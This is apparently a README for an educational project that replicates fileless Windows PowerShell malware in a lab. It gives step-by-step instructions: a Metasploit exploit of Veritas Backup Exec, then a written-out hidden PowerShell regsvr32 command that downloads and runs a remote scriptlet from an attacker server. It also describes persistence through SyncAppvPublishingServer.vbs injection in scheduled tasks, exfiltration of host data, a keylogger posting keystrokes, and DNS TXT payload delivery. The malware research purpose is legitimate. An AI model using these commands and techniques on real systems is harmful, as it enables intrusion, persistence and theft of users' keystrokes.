# BIT - Malware Analysis and Replication of Partial Windows File Less Malware

The project focused on malware analysis on real partial Windows File Less Malware implemented in PowerShell using many evasion techniques. This part of the project represents a small replication of this malware using some of the techniques used in the real Malware.

*All Anti-Malware and Anti-Virus products have been disabled during testing*

**DISCLAIMER: !!! ONLY FOR EDUCATIONAL PURPOSES !!!**

## Attack Vector
As an Attack vector we will be using **Veritas Backup Exec** software version **21.2** which us vulnerable to **RCE**. This software will be used as an entry point for attacker who will deploy malware payload remotely. Publicly known exploit creates PowerShell Reverse Shell without user interaction. (*metasploit - `multi/veritas/beagent_sha_auth_rca`*)
- Victim Machine has **Veritas Backup Exec Agent** installed
- Windows Server 2019 has **Veritas Backup Exec Server** installed
- Victim
- CVEs:
	- CVE-2021-27876
	- CVE-2021-27877
	- CVE-2021-27878

## Test Environment
- VMWare Workstation (or other Hypervisor)
- Windows Server 2019
	- Malicious DNS Server *(can be replaced by Kali Linux `bind9` DNS Server)*
		- DNS TXT Records used for delivering payloads
	- Veritas Backup Exec Server 
- Windows 10
	- Target Machine
	- Veritas Backup Exec Agent
- Kali Linux
	- Attacker Machine
	- File Server providing payloads (**updog**)
	- API Server (**FastAPI Python**)
		- Malware information leaking

All virtual hosts are hooked up to the same subnet (`10.10.10.0/24`)

## Used Techniques
See in documentation.

## How to run

1. Exploit Victim
	1. Open **metasploit**
	2. Select `multi/veritas/beagent_sha_auth_rca`
	3. Set IP address of Victim's computer
	4. `exploit`
	5. **PowerShell Reverse Shell**
2. Run Malware Initialization command from Reverse Shell
	```powershell
	powershell.exe -ep Bypass -WindowStyle Hidden -Command 'regsvr32.exe /u /s /i:http://10.10.10.10:56000/init.sct scrobj.dll
	```
	- This will run `regsrv` and downloads **XML** payload from **FileServer**
	- *Replace `10.10.10.10:56000`* with your fileserver IP:Port
3. Let the malware do it's job :)

## Malware Explanation

For demonstration purposes, malware phases and progress are recorded in `C:\Users\Public`

### Initialization 
After exploiting victim's computer we are able to to run commands as `nt authority/system`. We are calling `regsrv32` which will register `XML` in windows. This `XML` contains malicious JavaScript code whoch then executes powershell commands.
This will download and execute **Phase 1** payload.

### Phase 1
This phase will ensure persistency of malware using **Scheduled Tasks**. We are abusing Visual Basic Script - `SyncAppvPublishingServer.vbs` located in `C:\Windows\System32`. Script is taking arguments which are then executed in **PowerShell**. We can then **inject** arbitrary code by inserting anything as simple as `n` and deli metering our desired command by `;`.
Example: `SyncAppvPublishingServer.vbs "n ; <PSHELL Commands>"`

Scheduled tasks are started after creation. This will run **Phase2** and **Phase3 - DNs TXT Updates**
### Phase 2
This phase is downloaded and executed form Schedule tasks. This phase leaks computer Antivirus information, Public IP address, LAN information, GUID of computer and deploys *Keylogger*. 

Gathered information is then send to API.

### Phase 3 - KeyLogger
KeyLogger is deployed by **Phase2** and is capturing key strokes. Every 100 characters, **POST** request is sent to **API**.
This represents **Targeted Malware**. As **Phase 2** Gathered computer information, we can fine-tune and automate our malware to meet specific needs. After *Registering* computer in API, API sends **Chameleon** obfuscated **Keylogger** (*Targeted Malware*) PowerShell script which is then executed. 

### Phase 3 - DNS TXT
This phase demonstrates that payloads could also be delivered via **DNS TXT** records.

